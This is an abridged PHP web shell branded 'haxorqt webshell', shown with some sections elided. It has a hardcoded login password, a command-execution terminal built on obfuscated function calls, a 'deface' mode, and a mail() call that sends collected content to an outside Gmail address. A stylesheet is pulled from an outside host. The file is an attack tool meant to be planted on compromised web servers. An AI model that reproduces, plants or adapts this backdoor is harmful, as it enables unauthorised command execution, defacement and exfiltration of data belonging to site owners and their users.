...
$gcw = "getcwd";
$correctPassword = "root"; //Change Password
if (isset($_POST['pass'])) {
    ...
    if ($enteredPassword === $correctPassword) {
        ...
        echo '<script>alert("lepat passwordna");</script>';
    }
}
...
<style>
    body {
        background-image: url("https://i.pinimg.com/originals/a0/bf/31/a0bf31b06c55ec7098e7233835be1169.gif");
...
<html>
	<head>
		...
		<link rel='stylesheet' href='https://getbl.site/style.css'>
	...
	<div class='py-3' id='main'>
		...
		<div class='text-center'>
			<div class='btn-group'>
				...
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> command</a>
		...
		@mail('haxorqt@gmail.com', 'Hehehe', $email_content);
		}
		if($_7['id'] == 'deface'){
		...
		</div><div class='text-secondary'>&copy haxorqt webshell</div>
	</div>
</div>
</body>
</html>